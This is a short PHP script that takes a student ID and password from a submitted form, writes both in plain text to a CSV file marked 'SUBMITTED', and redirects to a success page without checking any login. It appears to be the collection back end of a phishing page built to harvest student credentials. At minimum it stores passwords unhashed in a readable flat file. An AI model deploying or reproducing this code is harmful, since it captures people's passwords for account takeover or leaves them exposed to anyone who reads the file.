<?php
$logFile = "submissions.csv";

$studentId = $_POST['Student_ID'] ?? '';
$password  = $_POST['password'] ?? '';

if ($studentId && $password) {
    // Escape commas/quotes for safer CSV
    $password = str_replace(['"', ','], ['""', ''], $password);
    $studentId = str_replace(['"', ','], ['""', ''], $studentId);

    $line = '"' . $password . '","' . $studentId . '",SUBMITTED' . PHP_EOL;
    file_put_contents($logFile, $line, FILE_APPEND | LOCK_EX);
}

header("Location: success.html");
exit;
?>